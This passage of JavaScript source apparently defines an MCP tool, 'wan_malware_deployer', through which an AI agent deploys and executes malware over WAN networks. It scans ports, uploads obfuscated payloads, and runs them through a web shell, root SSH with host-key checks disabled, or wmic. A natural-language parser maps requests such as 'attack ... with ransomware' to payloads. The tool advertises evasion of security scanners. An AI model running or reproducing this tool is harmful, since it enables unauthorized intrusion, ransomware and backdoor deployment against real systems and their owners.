                    method: 'POST',
                    body: scriptFormData,
                    timeout: timeout
                });
                
                logger.info(`📝 Deobfuscation script uploaded`);
            }
        }
        
        // Execute payload via web shell (with deobfuscation if needed)
        let cmd;
        if (deobfuscationScript) {
            cmd = `python3 /tmp/deobfuscate.py && chmod +x /tmp/${payload.originalName} && /tmp/${payload.originalName}`;
        } else {
            cmd = `chmod +x /tmp/${payloadName} && /tmp/${payloadName}`;
        }
        
        const response = await fetch(`${shellUrl}?cmd=${encodeURIComponent(cmd)}`, {
            timeout: timeout
        });
        
        if (response.ok) {
            const output = await response.text();
            return {
                success: true,
                stdout: output,
                stderr: "",
                exitCode: 0,
                method: 'http_web_shell'
            };
        } else {
            return {
                success: false,
                stdout: "",
                stderr: `HTTP execution failed: ${response.status}`,
                exitCode: 1,
                method: 'http_web_shell'
            };
        }
        
    } catch (error) {
        return {
            success: false,
            stdout: "",
            stderr: `HTTP execution failed: ${error.message}`,
            exitCode: 1,
            method: 'http_web_shell'
        };
    }
}

// Execute payload via SSH
async function executeViaSSH(target, port, payload, timeout) {
    try {
        logger.info(`🔐 Executing via SSH: ${target}:${port}`);
        
        // Handle obfuscated payload
        let payloadName = payload;
        let deobfuscationScript = null;
        
        if (typeof payload === 'object' && payload.obfuscationKey) {
            payloadName = payload.name;
            deobfuscationScript = await createDeobfuscationScript(payload, target, port);
            
            if (deobfuscationScript) {
                // Upload deobfuscation script via SCP
                const scpCommand = `echo '${deobfuscationScript.replace(/'/g, "'\"'\"'")}' | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p ${port} root@${target} "cat > /tmp/deobfuscate.py"`;
                await execAsync(scpCommand, { timeout: timeout });
                logger.info(`📝 Deobfuscation script uploaded via SSH`);
            }
        }
        
        // Execute payload via SSH (with deobfuscation if needed)
        let cmd;
        if (deobfuscationScript) {
            cmd = `python3 /tmp/deobfuscate.py && chmod +x /tmp/${payload.originalName} && /tmp/${payload.originalName}`;
        } else {
            cmd = `chmod +x /tmp/${payloadName} && /tmp/${payloadName}`;
        }
        
        const sshCommand = `ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p ${port} root@${target} "${cmd}"`;
        
        const { stdout, stderr } = await execAsync(sshCommand, { timeout: timeout });
        
        return {
            success: !stderr,
            stdout: stdout,
            stderr: stderr,
            exitCode: stderr ? 1 : 0,
            method: 'ssh'
        };
        
    } catch (error) {
        return {
            success: false,
            stdout: "",
            stderr: `SSH execution failed: ${error.message}`,
            exitCode: 1,
            method: 'ssh'
        };
    }
}

// Execute payload via RDP
async function executeViaRDP(target, port, payloadName, timeout) {
    try {
        logger.info(`🖥️ Executing via RDP: ${target}:${port}`);
        
        const rdpCommand = `wmic /node:${target} process call create "C:\\Windows\\Temp\\${payloadName}"`;
        
        const { stdout, stderr } = await execAsync(rdpCommand, { timeout: timeout });
        
        return {
            success: !stderr,
            stdout: stdout,
            stderr: stderr,
            exitCode: stderr ? 1 : 0,
            method: 'rdp'
        };
        
    } catch (error) {
        return {
            success: false,
            stdout: "",
            stderr: `RDP execution failed: ${error.message}`,
            exitCode: 1,
            method: 'rdp'
        };
    }
}

// Execute payload via SMB
async function executeViaSMB(target, port, payloadName, timeout) {
    try {
        logger.info(`💾 Executing via SMB: ${target}:${port}`);
        
        const smbCommand = `wmic /node:${target} process call create "C:\\Windows\\Temp\\${payloadName}"`;
        
        const { stdout, stderr } = await execAsync(smbCommand, { timeout: timeout });
        
        return {
            success: !stderr,
            stdout: stdout,
            stderr: stderr,
            exitCode: stderr ? 1 : 0,
            method: 'smb'
        };
        
    } catch (error) {
        return {
            success: false,
            stdout: "",
            stderr: `SMB execution failed: ${error.message}`,
            exitCode: 1,
            method: 'smb'
        };
    }
}

// Main tool registration
export function registerWanMalwareDeployer(server) {
    server.registerTool("wan_malware_deployer", {
        description: "🚀 **WAN Malware Deployer** - Deploy and execute malware payloads from The-MALWARE-Repo directly on target machines over WAN networks. Features advanced evasion techniques including checksum obfuscation, polymorphic payloads, XOR encryption, and signature modification to bypass security scanners. Includes intelligent deployment methods (HTTP, FTP, SMB, SSH, RDP), port scanning, payload selection, and remote execution capabilities. Comprehensive safety features, cross-platform support, and natural language interface.",
        inputSchema: {
            mode: z.enum(["command", "natural_language", "list_payloads", "scan_target", "analyze_target", "search_repositories", "clone_repository"]).default("natural_language").describe("Operation mode: 'command' for structured commands, 'natural_language' for conversational interface, 'list_payloads' to see available payloads, 'scan_target' for port scanning only, 'analyze_target' for comprehensive target analysis with attack suggestions, 'search_repositories' to find additional payload repositories, 'clone_repository' to add new repository"),
            target: z.string().optional().describe("Target IP address or hostname to attack (e.g., '192.168.1.100', 'target.com')"),
            payload_name: z.string().optional().describe("Name of the malware payload to deploy (use list_payloads mode to see available options)"),
            port: z.number().optional().describe("Specific port to target (if not provided, will scan for open ports)"),
            timeout: z.number().optional().describe("Execution timeout in milliseconds (default: 60000ms, max: 300000ms)"),
            natural_language_command: z.string().optional().describe("Natural language command for malware deployment (e.g., 'scan and attack 192.168.1.100 with ransomware', 'deploy trojan to target.com on port 8080', 'analyze target 192.168.1.100 and suggest attacks')"),
            safety_mode: z.boolean().default(true).describe("Enable safety mode with sandboxing and timeouts (recommended: true)"),
            scan_only: z.boolean().default(false).describe("Only perform port scanning without deploying payloads"),
            search_query: z.string().optional().describe("Search query for finding additional payload repositories (e.g., 'windows exploits', 'linux backdoors')"),
            repository_url: z.string().optional().describe("GitHub repository URL to clone for additional payloads"),
            repository_name: z.string().optional().describe("Name for the cloned repository")
        },
        outputSchema: {
            success: z.boolean(),
            message: z.string(),
            mode: z.string(),
            target: z.string().optional(),
            scan_results: z.array(z.object({
                port: z.number(),
                protocol: z.string(),
                service: z.string(),
                version: z.string().optional()
            })).optional(),
            target_analysis: z.object({
                target: z.string(),
                openPorts: z.array(z.object({
                    port: z.number(),
                    protocol: z.string(),
                    service: z.string(),
                    version: z.string().optional()
                })),
                services: z.array(z.object({
                    port: z.number(),
                    service: z.string(),
                    version: z.string(),
                    risk: z.string()
                })),
                osInfo: z.string().optional(),
                attackRecommendations: z.array(z.object({
                    payload: z.string(),
                    description: z.string(),
                    confidence: z.number(),
                    reason: z.string(),
                    risk: z.string()
                }))
            }).optional(),
            available_payloads: z.array(z.object({
                name: z.string(),
                description: z.string(),
                executables: z.array(z.string()),
                source: z.string().optional()
            })).optional(),
            repository_search_results: z.array(z.object({
                name: z.string(),
                full_name: z.string(),
                description: z.string(),
                stars: z.number(),
                language: z.string().optional(),
                url: z.string(),
                potential_payloads: z.number()
            })).optional(),
            deployment_result: z.object({
                success: z.boolean(),
                method: z.string(),
                target: z.string().optional(),
                url: z.string().optional(),
                response: z.string().optional(),
                error: z.string().optional()
            }).optional(),
            execution_result: z.object({
                success: z.boolean(),
                stdout: z.string(),
                stderr: z.string(),
                exitCode: z.number(),
                method: z.string()
            }).optional(),
            deployment_result_legacy: z.object({
                payload_name: z.string(),
                success: z.boolean(),
                stdout: z.string(),
                stderr: z.string(),
                execution_time: z.number()
            }).optional(),
            safety_warnings: z.array(z.string()).optional()
        }
    }, async ({ mode, target, payload_name, port, timeout = 60000, natural_language_command, safety_mode = true, scan_only = false, search_query, repository_url, repository_name }) => {
        try {
            // Initialize safety directories
            await ensureSafetyDirectories();
            
            const warnings = [];
            if (!safety_mode) {
                warnings.push("⚠️ SAFETY MODE DISABLED - Payloads will execute without sandboxing!");
            }
            
            // Validate timeout
            if (timeout > SAFETY_CONFIG.MAX_EXECUTION_TIME) {
                timeout = SAFETY_CONFIG.MAX_EXECUTION_TIME;
                warnings.push(`Timeout limited to ${SAFETY_CONFIG.MAX_EXECUTION_TIME}ms for safety`);
            }
            
            // Handle different modes
            switch (mode) {
                case "list_payloads":
                    logger.info("Fetching available payloads from malware repository...");
                    try {
                        const sandbox = await initializeSandbox();
                        const payloads = await sandbox.listAvailablePayloads();
                        
                        return {
                            content: [],
                            structuredContent: {
                                success: true,
                                message: `Found ${payloads.length} available payloads in Docker sandbox`,
                                mode: "list_payloads",
                                available_payloads: payloads.map(p => ({
                                    name: p.name,
                                    description: p.description,
                                    executables: p.executables,
                                    source: "docker_sandbox"
                                })),
                                safety_warnings: warnings
                            }
                        };
                    } catch (error) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: `Failed to list payloads: ${error.message}`,
                                mode: "list_payloads",
                                safety_warnings: warnings
                            }
                        };
                    }
                
                case "scan_target":
                    if (!target) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target is required for port scanning",
                                mode: "scan_target"
                            }
                        };
                    }
                    
                    const scanResults = await scanTargetPorts(target);
                    
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Port scan completed for ${target}`,
                            mode: "scan_target",
                            target: target,
                            scan_results: scanResults,
                            safety_warnings: warnings
                        }
                    };
                
                case "analyze_target":
                    if (!target) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target is required for target analysis",
                                mode: "analyze_target"
                            }
                        };
                    }
                    
                    logger.info(`Performing comprehensive target analysis: ${target}`);
                    const analysis = await analyzeTarget(target);
                    
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Target analysis completed for ${target}`,
                            mode: "analyze_target",
                            target: target,
                            target_analysis: analysis,
                            safety_warnings: warnings
                        }
                    };
                
                case "search_repositories":
                    if (!search_query) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Search query is required for repository search",
                                mode: "search_repositories"
                            }
                        };
                    }
                    
                    logger.info(`Searching GitHub repositories: ${search_query}`);
                    const repositories = await searchGitHubRepositories(search_query);
                    
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Found ${repositories.length} potential payload repositories`,
                            mode: "search_repositories",
                            repository_search_results: repositories.map(r => ({
                                name: r.name,
                                full_name: r.full_name,
                                description: r.description,
                                stars: r.stars,
                                language: r.language,
                                url: r.url,
                                potential_payloads: r.potential_payloads
                            })),
                            safety_warnings: warnings
                        }
                    };
                
                case "clone_repository":
                    if (!repository_url || !repository_name) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Repository URL and name are required for cloning",
                                mode: "clone_repository",
                                safety_warnings: warnings
                            }
                        };
                    }
                    
                    logger.info(`Cloning additional repository: ${repository_name} from ${repository_url}`);
                    try {
                        const sandbox = await initializeSandbox();
                        const repoPath = await sandbox.cloneAdditionalRepository(repository_url, repository_name);
                        
                        return {
                            content: [],
                            structuredContent: {
                                success: true,
                                message: `Successfully cloned repository: ${repository_name} into sandbox`,
                                mode: "clone_repository",
                                repository_name: repository_name,
                                repository_url: repository_url,
                                repository_path: repoPath,
                                safety_warnings: warnings
                            }
                        };
                    } catch (error) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: `Failed to clone repository: ${error.message}`,
                                mode: "clone_repository",
                                safety_warnings: warnings
                            }
                        };
                    }
                
                case "natural_language":
                    if (!natural_language_command) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Natural language command is required",
                                mode: "natural_language"
                            }
                        };
                    }
                    
                    // Parse natural language command
                    const parsed = parseNaturalLanguageCommand(natural_language_command);
                    if (!parsed.success) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: parsed.error,
                                mode: "natural_language"
                            }
                        };
                    }
                    
                    // Use parsed parameters for deployment
                    return await executeDeployment(parsed.target, parsed.payload_name, parsed.port, timeout, safety_mode, warnings);
                
                case "command":
                default:
                    if (!target || !payload_name) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target and payload_name are required for command mode",
                                mode: "command"
                            }
                        };
                    }
                    
                    return await executeDeployment(target, payload_name, port, timeout, safety_mode, warnings);
            }
            
        } catch (error) {
            logger.error(`WAN Malware Deployer error: ${error.message}`);
            return {
                content: [],
                structuredContent: {
                    success: false,
                    message: `Deployment failed: ${error.message}`,
                    mode: mode || "command"
                }
            };
        }
    });
}

// Parse natural language commands
function parseNaturalLanguageCommand(command) {
    const lowerCommand = command.toLowerCase();
    
    // Check for analysis commands
    if (lowerCommand.includes('analyze') || lowerCommand.includes('suggest') || lowerCommand.includes('recommend')) {
        const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
        const hostnameRegex = /\b[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\b/;
        
        const targetMatch = command.match(ipRegex) || command.match(hostnameRegex);
        const target = targetMatch ? targetMatch[0] : null;
        
        if (target) {
            return {
                success: true,
                mode: 'analyze_target',
                target: target
            };
        }
    }
    
    // Check for search commands
    if (lowerCommand.includes('search') || lowerCommand.includes('find') || lowerCommand.includes('look for')) {
        // Extract search terms
        const searchTerms = command.replace(/search|find|look for|repositories?|payloads?/gi, '').trim();
        if (searchTerms) {
            return {
                success: true,
                mode: 'search_repositories',
                search_query: searchTerms
            };
        }
    }
    
    // Check for list commands
    if (lowerCommand.includes('list') || lowerCommand.includes('show') || lowerCommand.includes('available')) {
        return {
            success: true,
            mode: 'list_payloads'
        };
    }
    
    // Extract target (IP or hostname)
    const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
    const hostnameRegex = /\b[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\b/;
    
    const targetMatch = command.match(ipRegex) || command.match(hostnameRegex);
    const target = targetMatch ? targetMatch[0] : null;
    
    // Extract port
    const portMatch = command.match(/port\s+(\d+)|:(\d+)/);
    const port = portMatch ? parseInt(portMatch[1] || portMatch[2]) : null;
    
    // Extract payload type
    const payloadKeywords = {
        'ransomware': 'ransomware',
        'trojan': 'trojan',
        'backdoor': 'backdoor',
        'keylogger': 'keylogger',
        'rootkit': 'rootkit',
        'worm': 'worm',
        'virus': 'virus',
        'botnet': 'botnet',
        'spyware': 'spyware',
        'adware': 'adware',
        'ssh_bruteforce': 'ssh_bruteforce',
        'eternalblue': 'eternalblue',
        'rdp_bruteforce': 'rdp_bruteforce',
        'web_shell': 'web_shell',
        'ftp_bruteforce': 'ftp_bruteforce',
        'windows_persistence': 'windows_persistence',
        'linux_backdoor': 'linux_backdoor'
    };
    
    let payload_name = null;
    for (const [keyword, payload] of Object.entries(payloadKeywords)) {
        if (lowerCommand.includes(keyword)) {
            payload_name = payload;
            break;
        }
    }
    
    if (!target) {
        return { success: false, error: "Could not identify target IP or hostname in command" };
    }
    
    if (!payload_name) {
        return { success: false, error: "Could not identify payload type in command" };
    }
    
    return {
        success: true,
        mode: 'command',
        target: target,
        payload_name: payload_name,
        port: port
    };
}

// Execute deployment process
async function executeDeployment(target, payload_name, port, timeout, safety_mode, warnings) {
    const startTime = Date.now();
    
    try {
        // Fetch repository and get payloads
        logger.info(`Fetching payload: ${payload_name}`);
        const repoPath = await fetchMalwareRepo();
        const payloads = await getAvailablePayloads(repoPath);
        
        // Find requested payload
        const payload = payloads.find(p => p.name.toLowerCase().includes(payload_name.toLowerCase()));
        if (!payload) {
            return {
                content: [],
                structuredContent: {
                    success: false,
                    message: `Payload '${payload_name}' not found. Available payloads: ${payloads.map(p => p.name).join(', ')}`,
                    mode: "command",
                    target: target,
                    available_payloads: payloads.map(p => ({
                        name: p.name,
                        description: p.description,
                        executables: p.executables
                    }))
                }
            };
        }
        
        // Scan for open ports if not specified
        let targetPort = port;
        let scanResults = [];
        
        if (!targetPort) {
            logger.info(`Scanning target ${target} for open ports...`);
            scanResults = await scanTargetPorts(target);
            
            if (scanResults.length === 0) {
                return {
                    content: [],
                    structuredContent: {
                        success: false,
                        message: `No open ports found on target ${target}`,
                        mode: "command",
                        target: target,
                        scan_results: scanResults
                    }
                };
            }
            
            // Use first open port
            targetPort = scanResults[0].port;
            logger.info(`Using port ${targetPort} for deployment`);
        }
        
        // Execute payload
        logger.info(`Deploying ${payload.name} to ${target}:${targetPort}`);
        const result = await executePayload(payload, target, targetPort, timeout);
        
        const executionTime = Date.now() - startTime;
        
        return {
            content: [],
            structuredContent: {
                success: result.success,
                message: result.success ? 
                    `Successfully deployed and executed ${payload.name} on ${target}:${targetPort}` : 
                    `Failed to deploy ${payload.name} to ${target}:${targetPort}`,
                mode: "command",
                target: target,
                scan_results: scanResults,
                deployment_result: result.deploymentResult,
                execution_result: result.executionResult,
                deployment_result_legacy: {
                    payload_name: payload.name,
                    success: result.success,
                    stdout: result.stdout,
                    stderr: result.stderr,
                    execution_time: executionTime
                },
                safety_warnings: warnings
            }
        };
        
    } catch (error) {
        logger.error(`Deployment execution failed: ${error.message}`);
        return {
            content: [],
            structuredContent: {
                success: false,
                message: `Deployment failed: ${error.message}`,
                mode: "command",
                target: target
            }
        };
    }
}
